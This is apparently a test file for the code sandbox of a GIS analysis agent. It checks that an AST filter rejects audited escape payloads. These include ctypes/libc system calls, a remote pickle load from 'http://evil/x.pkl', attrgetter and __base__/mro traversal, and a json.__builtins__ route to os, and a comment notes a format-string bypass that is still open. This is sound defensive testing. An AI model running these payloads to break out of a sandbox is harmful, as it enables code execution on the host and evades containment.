"""SEC-SANDBOX-RCE (parte 1) — endurecimiento del filtro AST.

Defensa en profundidad: los vectores concretos de RCE/egreso que halló la
auditoría deben AHORA ser rechazados por analyze_security. La barrera REAL
sigue siendo el contenedor endurecido (parte 2, infra); esto sube el listón
estático y cierra los exploits conocidos.
"""

from __future__ import annotations

import pytest

from geo_copilot.agents.gis_agent.sandbox import PythonSandbox


@pytest.fixture
def sb():
    return PythonSandbox()


def _safe(sb, code) -> bool:
    return sb.analyze_security(code)["is_safe"]


# ─────────────────── exploits que AHORA deben bloquearse ────────────────────
class TestExploitsBloqueados:
    def test_numpy_ctypeslib_import(self, sb):
        assert not _safe(sb, "import numpy.ctypeslib as n")

    def test_from_numpy_import_ctypeslib(self, sb):
        assert not _safe(sb, "from numpy import ctypeslib")

    def test_rce_ctypes_cdll_system_completo(self, sb):
        # El exploit insignia de la auditoría, extremo a extremo.
        exploit = (
            "import numpy.ctypeslib as n\n"
            "libc = n.ctypes.CDLL('libc.so.6')\n"
            "libc['system'](b'id')\n"
        )
        assert not _safe(sb, exploit)

    def test_acceso_atributo_ctypes(self, sb):
        # arr.ctypes reexpone el módulo ctypes.
        assert not _safe(sb, "import numpy as np\nx = np.array([1]).ctypes")

    def test_read_pickle_url_rce_deserializacion(self, sb):
        assert not _safe(sb, "import pandas as pd\npd.read_pickle('http://evil/x.pkl')")

    def test_sklearn_datasets_egreso_red(self, sb):
        assert not _safe(sb, "from sklearn.datasets import fetch_openml")

    def test_statsmodels_datasets_egreso_red(self, sb):
        assert not _safe(sb, "import statsmodels.datasets as d")

    def test_scipy_datasets_egreso_red(self, sb):
        assert not _safe(sb, "import scipy.datasets")

    def test_numpy_f2py_compila_codigo(self, sb):
        assert not _safe(sb, "import numpy.f2py")


# ─── SBX-01/SBX-04 — bypass del AST vía getattr-por-string y traversal ───────
class TestBypassAstCerrados:
    """Vectores que EVADÍAN el filtro (auditoría E2E 2026-07-20): getattr
    indirecto por string (`operator.attrgetter`/`methodcaller`) y traversal de
    tipos por atributos que el denylist omitía (`__base__`, `mro`)."""

    def test_import_operator_bloqueado(self, sb):
        # Raíz del bypass: `operator` salió del allowlist.
        assert not _safe(sb, "import operator")

    def test_from_operator_import_attrgetter_bloqueado(self, sb):
        assert not _safe(sb, "from operator import attrgetter, methodcaller")

    def test_exploit_attrgetter_getattr_por_string_completo(self, sb):
        # El vector insignia de la auditoría, end-to-end.
        exploit = (
            "import operator\n"
            "g = operator.attrgetter\n"
            "base = g('__class__.__base__')(())\n"
            "subs = g('__subclasses__')(base)()\n"
        )
        assert not _safe(sb, exploit)

    def test_metodo_attrgetter_por_atributo(self, sb):
        # Aunque `operator` se alcanzara por otra vía, la llamada al método
        # attrgetter/methodcaller se rechaza (FORBIDDEN_METHODS).
        assert not _safe(sb, "x.attrgetter('__class__')")
        assert not _safe(sb, "x.methodcaller('__subclasses__')")

    def test_mro_traversal_bloqueado(self, sb):
        # `type(()).mro()[-1]` alcanza object sin usar __bases__.
        assert not _safe(sb, "base = type(()).mro()[-1]")

    def test_base_singular_bloqueado(self, sb):
        # __base__ (singular) alcanza object igual que __bases__.
        assert not _safe(sb, "b = ().__class__.__base__")

    def test_reduce_ex_bloqueado(self, sb):
        assert not _safe(sb, "r = (1).__reduce_ex__(2)")

    # NOTA (residual): el traversal por format-string
    # (`"{0.__class__.__init__.__globals__}".format(obj)`) ocurre en runtime
    # dentro del string y es invisible al AST; NO se bloquea `.format` porque
    # rompería el formateo legítimo. Lo contiene el contenedor endurecido
    # (backend docker, default del despliegue), no el filtro estático.


# ─────── análisis espacial avanzado (PySAL/redes) — DEBE pasar el allowlist ──
class TestEspacialAvanzadoPermitido:
    def test_moran_autocorrelacion(self, sb):
        assert _safe(sb, "from libpysal.weights import KNN\nfrom esda.moran import Moran, Moran_Local")

    def test_getisord_hotspots(self, sb):
        assert _safe(sb, "from esda.getisord import G_Local")

    def test_regresion_espacial(self, sb):
        assert _safe(sb, "import spreg")

    def test_point_patterns(self, sb):
        assert _safe(sb, "from pointpats import PointPattern")

    def test_redes_networkx(self, sb):
        assert _safe(sb, "import networkx as nx")

    def test_voronoi_delaunay(self, sb):
        assert _safe(sb, "from scipy.spatial import Voronoi, Delaunay, ConvexHull")

    def test_libpysal_examples_bloqueado(self, sb):
        # examples descarga datasets remotos → egreso de red → bloqueado.
        assert not _safe(sb, "from libpysal import examples")


# ─────────────── código analítico LEGÍTIMO que debe seguir pasando ──────────
class TestLegitimoSiguePasando:
    def test_clustering_dbscan(self, sb):
        code = (
            "import geopandas as gpd\n"
            "from sklearn.cluster import DBSCAN\n"
            "import numpy as np\n"
            "labels = DBSCAN(eps=0.5).fit_predict(np.array([[0,0],[1,1]]))\n"
        )
        assert _safe(sb, code)

    def test_correlacion_y_regresion(self, sb):
        code = (
            "import pandas as pd\n"
            "from scipy.stats import pearsonr\n"
            "import statsmodels.api as sm\n"
            "r, p = pearsonr([1,2,3], [1,2,3])\n"
            "model = sm.OLS([1,2,3], [1,2,3]).fit()\n"
        )
        assert _safe(sb, code)

    def test_operacion_geometrica_basica(self, sb):
        code = (
            "import geopandas as gpd\n"
            "from shapely.ops import unary_union\n"
            "result = gpd.GeoDataFrame()\n"
        )
        assert _safe(sb, code)


class TestEscapePorBuiltins:
    """R0.5 (auditoría 2026-07-26, AUD-03).

    El denylist de `visit_Attribute` bloqueaba `__class__`, `__globals__`,
    `__mro__`, `ctypes`... pero NO `__builtins__`, que sólo se comprobaba en
    `visit_Name` (a secas, no como atributo de un módulo). La auditoría verificó
    ejecutando el runner real que este payload devolvía el diccionario COMPLETO
    de builtins (`eval`, `exec`, `open`, `__import__`), leía ficheros del host y
    obtenía `socket.socket`.

    IMPORTANTE: estos tests NO significan que el filtro AST sea una barrera. La
    contención real es el contenedor (`SANDBOX_BACKEND=docker`). Son defensa en
    profundidad; ver `enforce_sandbox_backend`.
    """

    ESCAPE_VERIFICADO = (
        "import json\n"
        "b = json.__builtins__\n"
        "imp = b['__import__']\n"
        "o = imp('os')\n"
        "f = o.getcwd\n"
        "leak = f()\n"
    )

    def test_el_escape_verificado_ya_no_pasa_el_filtro(self):
        from geo_copilot.agents.gis_agent.sandbox import PythonSandbox

        resultado = PythonSandbox().analyze_security(self.ESCAPE_VERIFICADO)
        assert resultado["is_safe"] is False
        assert resultado["violations"], "debe declarar QUÉ violó, no fallar mudo"

    @pytest.mark.parametrize(
        "payload",
        [
            "import json\nx = json.__builtins__\n",           # atributo dunder
            "import math\nx = math.__loader__\n",
            "d = {}\ny = d['__import__']\n",                   # subscript dunder
            "d = {}\ny = d['eval']\n",                         # subscript a nombre prohibido
        ],
    )
    def test_vias_equivalentes_de_alcanzar_builtins(self, payload):
        from geo_copilot.agents.gis_agent.sandbox import PythonSandbox

        assert PythonSandbox().analyze_security(payload)["is_safe"] is False

    @pytest.mark.parametrize(
        "payload",
        [
            "result = gdf.area.sum()\n",
            "result = gdf[gdf['area_m2'] > 100]\n",            # subscript normal: NO debe romperse
            "result = df['poblacion'].mean()\n",
            "import geopandas as gpd\nresult = gpd.GeoDataFrame(data)\n",
        ],
    )
    def test_no_rompe_el_codigo_geoespacial_legitimo(self, payload):
        from geo_copilot.agents.gis_agent.sandbox import PythonSandbox

        resultado = PythonSandbox().analyze_security(payload)
        assert resultado["is_safe"] is True, resultado["violations"]
